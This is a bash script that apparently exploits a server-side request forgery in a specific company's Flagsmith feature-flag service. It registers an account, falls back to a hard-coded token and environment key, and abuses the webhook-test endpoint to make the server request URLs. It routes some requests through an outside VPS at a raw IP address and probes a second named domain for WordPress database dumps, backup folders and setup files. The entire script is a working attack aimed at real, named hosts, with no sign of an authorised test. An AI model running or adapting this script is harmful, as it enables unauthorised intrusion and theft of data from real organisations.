#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-v13@proton.me","password":"Xk9mPw3nRt!13","first_name":"V","last_name":"13"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
[ -z "$KEY" ] && KEY="87e2431cf1869ab16f10eb96774f0c905f947935" && EKEY="95nCRUg5XVfxsREBb5YUiw" && echo "Fallback"

if [ -z "$EKEY" ]; then
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v13"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
fi
echo "Env: $EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

# SSRF via 303 redirect → GET (bypasses POST-only restrictions)
SSRF_GET() {
  # Use VPS 303 redirect to convert POST → GET
  # First update VPS redirect target (not possible from GH actions)
  # So use direct URL parameter approach
  SSRF "http://64.227.62.83:8891/$1"
}

# Enumerate files via direct POST (status codes tell us what exists)
echo "=== FILE ENUMERATION ==="
for path in \
  "wp-content/uploads/" \
  "wp-content/backup-db/" \
  "wp-content/backups/" \
  "wp-content/cache/" \
  "wp-content/updraft/" \
  "wp-content/ai1wm-backups/" \
  "wp-content/mysql.sql" \
  "wp-content/database.sql" \
  "wp-content/dump.sql" \
  "wp-content/db-backup/" \
  "readme.html" \
  "license.txt" \
  "wp-includes/version.php" \
  "wp-admin/install.php" \
  "wp-admin/setup-config.php"; do
  echo -n "$path -> "
  SSRF "https://koinp2p.com/${path}"
  echo ""
done

# Check if UpdraftPlus backup files are accessible
echo "=== UPDRAFT BACKUPS ==="
for f in \
  "wp-content/updraft/" \
  "wp-content/updraft/index.html" \
  "wp-content/plugins/updraftplus/readme.txt"; do
  echo -n "$f -> "
  SSRF "https://koinp2p.com/${f}"
  echo ""
done
